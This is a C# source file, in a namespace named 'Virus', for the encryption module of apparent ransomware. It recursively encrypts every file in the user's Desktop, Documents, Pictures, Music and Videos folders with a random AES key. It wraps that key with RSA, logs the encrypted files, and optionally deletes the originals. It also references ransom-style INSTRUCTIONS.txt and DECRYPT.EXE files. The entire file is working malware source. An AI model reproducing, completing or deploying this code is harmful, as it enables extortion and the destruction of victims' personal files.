using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using static Virus.RegHelpers;
using static Virus.Form2;

namespace Virus
{
    class AESencryption
    {
        //TODO Remove  && !f.Contains(".ignore") from this document.
        private static string _encryptedExtension = ".encrypt";
        public static string _aesKey;  //generate random key
        private static bool _DeleteAfterDecrypt = true;
        private static bool _DeleteAfterEncrypt = false;

        public static string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        private static string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        private static string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        private static string MUSIC_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
        private static string VIDEOS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);

        public static string instructionstxt = DESKTOP_FOLDER+@"\INSTRUCTIONS.txt";
        public static string encrypttxt = DESKTOP_FOLDER+@"\ENCRYPTED.txt";
        public static string decryptexe = DESKTOP_FOLDER + @"\DECRYPT.EXE";

        public static int _encryptedFileCount = 0;
        private static UnicodeEncoding _encoder = new UnicodeEncoding();

        /// <summary>
        /// Generates Random String Used As AES Password To Encrypt And Decrypt Files
        /// </summary>
        /// <param name="length"></param>
        /// <param name="chars"></param>
        /// <returns></returns>
        public static string GenerateRandomString(int length, string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_")
        {
            using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())
            {
                byte[] data = new byte[length];

                // If chars.Length isn't a power of 2 then there is a bias if we simply use the modulus operator. The first characters of chars will be more probable than the last ones.
                // buffer used if we encounter an unusable random byte. We will regenerate it in this buffer
                byte[] buffer = null;

                // Maximum random number that can be used without introducing a bias
                int maxRandom = byte.MaxValue - ((byte.MaxValue + 1) % chars.Length);

                crypto.GetBytes(data);

                char[] result = new char[length];

                for (int i = 0; i < length; i++)
                {
                    byte value = data[i];

                    while (value > maxRandom)
                    {
                        if (buffer == null)
                        {
                            buffer = new byte[1];
                        }

                        crypto.GetBytes(buffer);
                        value = buffer[0];
                    }

                    result[i] = chars[value % chars.Length];
                }

                return new string(result);
            }
        }

        //  Call this function to remove the key from memory after use for security
        [DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        public static extern bool ZeroMemory(IntPtr Destination, int Length);

        /// <summary>
        /// Creates a random salt that will be used to encrypt your file. This method is required on FileEncrypt.
        /// </summary>
        /// <returns></returns>
        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    // Fille the buffer with the generated data
                    rng.GetBytes(data);
                }
            }

            return data;
        }

        /// <summary>
        /// Encrypts a file from its path using a random string.
        /// </summary>
        /// <param name="inputFile"></param>
        /// <param name="password"></param>
        private static void FileEncrypt(string inputFile, string password)
        {
            //http://stackoverflow.com/questions/27645527/aes-encryption-on-large-files

            //generate random salt
            byte[] salt = GenerateRandomSalt();

            //create output file name
            FileStream fsCrypt = new FileStream(inputFile + _encryptedExtension, FileMode.Create);

            //convert password string to byte arrray
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            //Set Rijndael symmetric encryption algorithm
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            //http://stackoverflow.com/questions/2659214/why-do-i-need-to-use-the-rfc2898derivebytes-class-in-net-instead-of-directly
            //"What it does is repeatedly hash the user password along with the salt." High iteration counts.
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            //Cipher modes: http://security.stackexchange.com/questions/52665/which-is-the-best-cipher-mode-and-padding-mode-for-aes-encryption
            AES.Mode = CipherMode.CFB;

            // write salt to the begining of the output file, so in this case can be random every time
            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    Application.DoEvents(); // -> for responsive GUI, using Task will be better!
                    cs.Write(buffer, 0, read);
                }

                // Close up
                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally 
            {
                File.AppendAllText(encrypttxt, $"\n{inputFile}");
                cs.Close();
                fsCrypt.Close();
            }
        }

        /// <summary>
        /// Decrypts an encrypted file with the FileEncrypt method through its path and the plain password.
        /// </summary>
        /// <param name="inputFile"></param>
        /// <param name="outputFile"></param>
        /// <param name="password"></param>
        private static void FileDecrypt(string inputFile, string password)
        {

            string outputFile = inputFile.Replace(_encryptedExtension, "");
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] salt = new byte[32];

            FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);
            fsCrypt.Read(salt, 0, salt.Length);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            //AES.Padding = PaddingMode.PKCS7; original
            AES.Padding = PaddingMode.Zeros;
            AES.Mode = CipherMode.CFB;

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);

            FileStream fsOut = new FileStream(outputFile, FileMode.Create);

            int read;
            byte[] buffer = new byte[1048576];

            try
            {
                while ((read = cs.Read(buffer, 0, buffer.Length)) > 0)
                {
                    Application.DoEvents();
                    fsOut.Write(buffer, 0, read);
                }
            }
            catch (CryptographicException ex_CryptographicException)
            {
                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            try
            {
                cs.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
            }
            finally
            {
                fsOut.Close();
                fsCrypt.Close();
            }
        }

        /// <summary>
        /// Public Method to start encrypting
        /// </summary>
        public static void StartEncryption()
        { 
            if (_aesKey == null)
            {
                _aesKey = GenerateRandomString(32); //Created
                Debug.WriteLine(_aesKey);
                SetAESkey(RSAencryption.Encrypt(_aesKey)); //Once finished encrypting files, encrypt the aes key using rsa
            }
            List<string> dirToEncrypt = new List<string>() { DESKTOP_FOLDER, DOCUMENTS_FOLDER, PICTURES_FOLDER, MUSIC_FOLDER, VIDEOS_FOLDER };
            foreach (var dir in dirToEncrypt)
            {
                encryptFolderContents(dir, _aesKey);
            }
            _aesKey = GetAESkey(); //only needed on first run. does no harm on second run etc.

            

        }

        /// <summary>
        /// Public Method To Start Decryption
        /// </summary>
        /// <param name="privkeytypedin"></param>
        /// <returns></returns>
        public static bool StartDecryption(string privkeytypedin)
        {
            string decryptedaeskey = RSAencryption.Decrypt(_aesKey, privkeytypedin);
            List<string> dirToDecrypt = new List<string>() { DESKTOP_FOLDER, DOCUMENTS_FOLDER, PICTURES_FOLDER, MUSIC_FOLDER, VIDEOS_FOLDER };
            foreach (var dir in dirToDecrypt)
            {
                decryptFolderContents(dir, decryptedaeskey);
            }
            return true; //return anythinfg to make awaitable.
        }

        /// <summary>
        /// Used for encrypting folder contents inside directories/other folders.
        /// </summary>
        /// <param name="sDir"></param>
        /// <param name="_aesKey"></param>
        static void encryptFolderContents(string sDir, string _aesKey)
        {
            try
            {
                foreach (string f in Directory.GetFiles(sDir))
                {
                    try
                    {
                        if (!f.Contains(_encryptedExtension) && !f.Contains(".ignore") && f != System.AppDomain.CurrentDomain.FriendlyName && f != instructionstxt && f != encrypttxt && f != decryptexe)
                        {
                            Debug.WriteLine("Encrypting: " + f);
                            FileEncrypt(f, _aesKey);
                            _encryptedFileCount++;
                            Debug.WriteLine($"{_encryptedFileCount} {f}");
                        }
                    }
                    catch (System.Exception excpt)
                    {
                        Console.WriteLine(excpt.Message);
                    }
                    if (_DeleteAfterEncrypt && File.Exists($"{f}{_encryptedExtension}"))
                    {
                        File.Delete(f);
                        Debug.WriteLine($"{f} was deleted.");
                    }
                }

                foreach (string d in Directory.GetDirectories(sDir))
                {
                    encryptFolderContents(d, _aesKey);
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }

        }

        /// <summary>
        /// Used for decrypting folder contents inside directories/other folders.
        /// </summary>
        /// <param name="sDir"></param>
        /// <param name="_aesKey"></param>
        static void decryptFolderContents(string sDir, string _aesKey)
        {
            try
            {
                foreach (string f in Directory.GetFiles(sDir))
                {
                    try
                    {
                        if (f.Contains(_encryptedExtension) && !f.Contains(".ignore") && f != System.AppDomain.CurrentDomain.FriendlyName)
                        {
                            Console.Out.WriteLine("Decrypting: " + f);
                            FileDecrypt(f, _aesKey);
                            _encryptedFileCount--;
                        }
                    }
                    catch (System.Exception excpt)
                    {
                        Console.WriteLine(excpt.Message);
                    }
                    if (_DeleteAfterDecrypt)
                    {
                        File.Delete(f);
                    }
                }

                foreach (string d in Directory.GetDirectories(sDir))
                {
                    decryptFolderContents(d, _aesKey);
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }

    }
}